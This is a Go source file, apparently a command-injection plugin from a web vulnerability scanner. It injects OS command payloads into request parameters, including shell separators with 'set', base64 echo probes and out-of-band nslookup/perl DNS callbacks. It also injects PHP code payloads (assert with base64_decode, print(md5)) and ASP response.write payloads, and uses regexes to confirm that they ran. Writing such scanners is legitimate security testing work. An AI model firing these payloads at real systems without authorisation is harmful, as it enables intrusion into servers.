package cmdinject

/**
  @author: yhy
  @since: 2023/1/30
  @desc: //TODO
**/
import (
	"fmt"
	"github.com/thoas/go-funk"
	regexp "github.com/wasilibs/go-re2"
	"github.com/yhy0/ChYing/pkg/Jie/conf"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/input"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/output"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/reverse"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/util"
	"github.com/yhy0/logging"
	"strings"
	"sync"
	"time"
)

var domainPayloadList = []string{
	`|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
	// `&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&\'\\"`0&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&`\'`,
	`;(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")&(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
	"(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
	"$(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
	"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
}

type Plugin struct {
	SeenRequests sync.Map
}

func (p *Plugin) Scan(target string, path string, in *input.CrawlResult, client *httpx.Client) {
	if p.IsScanned(in.UniqueId) {
		return
	}
	variations, err := httpx.ParseUri(in.Url, []byte(in.RequestBody), in.Method, in.ContentType, in.Headers)
	if err != nil {
		if strings.Contains(err.Error(), "data is empty") {
			logging.Logger.Debugln(err.Error())
		} else {
			logging.Logger.Errorln(err.Error())
		}
		return
	}
	logging.Logger.Debugln(in.Method, in.Url, in.RequestBody, "\n", variations.OriginalParams, "cmd inject scan start")
	if !command(in, client, variations) {
		logging.Logger.Debugln(in.Url, "cmd inject vulnerability not found")
	}
}

func (p *Plugin) IsScanned(key string) bool {
	if key == "" {
		return false
	}
	if _, ok := p.SeenRequests.Load(key); ok {
		return true
	}
	p.SeenRequests.Store(key, true)
	return false
}

func (p *Plugin) Name() string {
	return "cmd"
}

func command(in *input.CrawlResult, client *httpx.Client, variations *httpx.Variations) bool {
	var err error
	if conf.GlobalConfig.Reverse.Host != "" {
		dnslog := reverse.GetSubDomain()
		if dnslog != nil && variations != nil {
			for _, p := range variations.Params {
				for _, payload := range domainPayloadList {
					s1 := strings.ReplaceAll(payload, "{domain}", dnslog.Domain)
					originPayload := variations.SetPayloadByIndex(p.Index, in.Url, s1, in.Method)
					if originPayload == "" {
						continue
					}
					var res *httpx.Response
					if in.Method == "GET" {
						res, err = client.Request(originPayload, in.Method, "", in.Headers, "Cmd-Inject")
					} else {
						res, err = client.Request(in.Url, in.Method, originPayload, in.Headers, "Cmd-Inject")
					}

					if err != nil {
						continue
					}

					if reverse.PullLogs(dnslog) {
						output.OutChannel <- output.VulMessage{
							DataType: "web_vul",
							Plugin:   "CMD-INJECT",
							VulnData: output.VulnData{
								CreateTime: time.Now().Format("2006-01-02 15:04:05"),
								Target:     in.Url,
								Method:     in.Method,
								Ip:         in.Ip,
								Param:      in.Kv,
								Request:    res.RequestDump,
								Response:   res.ResponseDump,
								Payload:    originPayload + " key: " + dnslog.Token + " msg: " + dnslog.Msg,
							},
							Level: output.Critical,
						}
						return true
					}
				}
			}
		}
	}

	if systemCommand(in, client, variations) {
		return false
	}

	if util.InSliceCaseFold("php", in.Fingerprints) {
		return phpCommand(in, client, variations)
	} else if util.InSliceCaseFold("asp", in.Fingerprints) {
		return aspCommand(in, client, variations)
	}
	return false
}

// systemCommand 系统命令执行
func systemCommand(in *input.CrawlResult, client *httpx.Client, variations *httpx.Variations) bool {
	var err error
	var payloads = map[string][]string{
		"set|set&set": {
			`Path=[\s\S]*?PWD=`,
			`Path=[\s\S]*?PATHEXT=`,
			`Path=[\s\S]*?SHELL=`,
			`Path\x3d[\s\S]*?PWD\x3d`,
			`Path\x3d[\s\S]*?PATHEXT\x3d`,
			`Path\x3d[\s\S]*?SHELL\x3d`,
			`SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=`,
			`SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d`,
			`Non-authoritative\sanswer:\s+Name:\s*`,
			`Server:\s*.*?\nAddress:\s*`,
		},
		`" "set" | "set" & "set" |"`: {
			`Path=[\s\S]*?PWD=`,
			`Path=[\s\S]*?PATHEXT=`,
			`Path=[\s\S]*?SHELL=`,
			`Path\x3d[\s\S]*?PWD\x3d`,
			`Path\x3d[\s\S]*?PATHEXT\x3d`,
			`Path\x3d[\s\S]*?SHELL\x3d`,
			`SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=`,
			`SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d`,
			`Non-authoritative\sanswer:\s+Name:\s*`,
			`Server:\s*.*?\nAddress:\s*`,
		},
		fmt.Sprintf("echo `echo 6162983|base64`6162983%v", util.RandomNumber(1000, 9999)): {
			"NjE2Mjk4Mwo=6162983",
		},
	}

	if variations != nil {
		for _, p := range variations.Params {
			for _, spli := range []string{"", ";", "&&", "|"} {
				for payload, reList := range payloads {
					payload = spli + payload
					originPayload := variations.SetPayloadByIndex(p.Index, in.Url, payload, in.Method)
					if originPayload == "" {
						continue
					}
					var res *httpx.Response
					if in.Method == "GET" {
						res, err = client.Request(originPayload, in.Method, "", in.Headers, "Cmd-Inject")
					} else {
						res, err = client.Request(in.Url, in.Method, originPayload, in.Headers, "Cmd-Inject")
					}
					if err != nil {
						continue
					}

					for _, reStr := range reList {
						re, _ := regexp.Compile(reStr)
						result := re.FindString(res.ResponseDump)
						if result != "" {
							output.OutChannel <- output.VulMessage{
								DataType: "web_vul",
								Plugin:   "CMD-INJECT",
								VulnData: output.VulnData{
									CreateTime: time.Now().Format("2006-01-02 15:04:05"),
									Target:     in.Url,
									Method:     in.Method,
									Ip:         in.Ip,
									Param:      in.Kv,
									Request:    res.RequestDump,
									Response:   res.ResponseDump,
									Payload:    originPayload,
								},
								Level: output.Critical,
							}
							return true
						}
					}
				}
			}
		}
	}

	return false
}

// phpCommand php 代码执行
func phpCommand(in *input.CrawlResult, client *httpx.Client, variations *httpx.Variations) bool {
	var err error
	// PHP code injection
	var payloads = []string{
		`;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));`,
		`';print(md5(31337));$a='`,
		`\";print(md5(31337));$a=\"`,
		`${@print(md5(31337))}`,
		`${@print(md5(31337))}\\`,
		`'.print(md5(31337)).'`,
	}

	if variations != nil {
		for _, p := range variations.Params {
			for _, payload := range payloads {
				originPayload := variations.SetPayloadByIndex(p.Index, in.Url, payload, in.Method)
				if originPayload == "" {
					continue
				}
				var res *httpx.Response
				if in.Method == "GET" {
					res, err = client.Request(originPayload, in.Method, "", in.Headers, "Cmd-Inject")
				} else {
					res, err = client.Request(in.Url, in.Method, originPayload, in.Headers, "Cmd-Inject")
				}

				logging.Logger.Debugln("payload:", originPayload)
				if err != nil {
					continue
				}

				if funk.Contains(res.ResponseDump, "6f3249aa304055d63828af3bfab778f6") {
					output.OutChannel <- output.VulMessage{
						DataType: "web_vul",
						Plugin:   "CMD-INJECT",
						VulnData: output.VulnData{
							CreateTime: time.Now().Format("2006-01-02 15:04:05"),
							Target:     in.Url,
							Method:     in.Method,
							Ip:         in.Ip,
							Param:      in.Kv,
							Request:    res.RequestDump,
							Response:   res.ResponseDump,
							Payload:    originPayload,
						},
						Level: output.Critical,
					}
					return true
				}

				var regexphp = `Parse error: syntax error,.*?\sin\s.*?\(\d+\).*?eval\(\)\'d\scode\son\sline\s<i>\d+<\/i>`
				re, _ := regexp.Compile(regexphp)
				result := re.FindString(res.ResponseDump)
				if result != "" {
					output.OutChannel <- output.VulMessage{
						DataType: "web_vul",
						Plugin:   "CMD-INJECT",
						VulnData: output.VulnData{
							CreateTime: time.Now().Format("2006-01-02 15:04:05"),
							Target:     in.Url,
							Method:     in.Method,
							Ip:         in.Ip,
							Param:      in.Kv,
							Request:    res.RequestDump,
							Response:   res.ResponseDump,
							Payload:    payload,
						},
						Level: output.Critical,
					}
					return true
				}

			}
		}
	}
	return false
}

// aspCommand asp 代码执行
func aspCommand(in *input.CrawlResult, client *httpx.Client, variations *httpx.Variations) bool {
	var err error
	randint1 := util.RandomNumber(10000, 90000)
	randint2 := util.RandomNumber(10000, 90000)
	randint3 := randint1 * randint2

	// asp code injection
	var payloads = []string{
		fmt.Sprintf(`response.write(%v*%v)`, randint1, randint2),
		fmt.Sprintf(`'+response.write(%v*%v)+'`, randint1, randint2),
		fmt.Sprintf(`"response.write(%v*%v)+"`, randint1, randint2),
	}

	if variations != nil {
		for _, p := range variations.Params {
			for _, payload := range payloads {
				originPayload := variations.SetPayloadByIndex(p.Index, in.Url, payload, in.Method)
				if originPayload == "" {
					continue
				}
				var res *httpx.Response
				if in.Method == "GET" {
					res, err = client.Request(originPayload, in.Method, "", in.Headers, "Cmd-Inject")
				} else {
					res, err = client.Request(in.Url, in.Method, originPayload, in.Headers, "Cmd-Inject")
				}

				logging.Logger.Debugln("payload:", originPayload)
				if err != nil {
					continue
				}

				if funk.Contains(res.ResponseDump, randint3) {
					output.OutChannel <- output.VulMessage{
						DataType: "web_vul",
						Plugin:   "CMD-INJECT",
						VulnData: output.VulnData{
							CreateTime: time.Now().Format("2006-01-02 15:04:05"),
							Target:     in.Url,
							Method:     in.Method,
							Ip:         in.Ip,
							Param:      in.Kv,
							Request:    res.RequestDump,
							Response:   res.ResponseDump,
							Payload:    originPayload,
						},
						Level: output.Critical,
					}
					return true
				}
			}
		}
	}

	return false
}
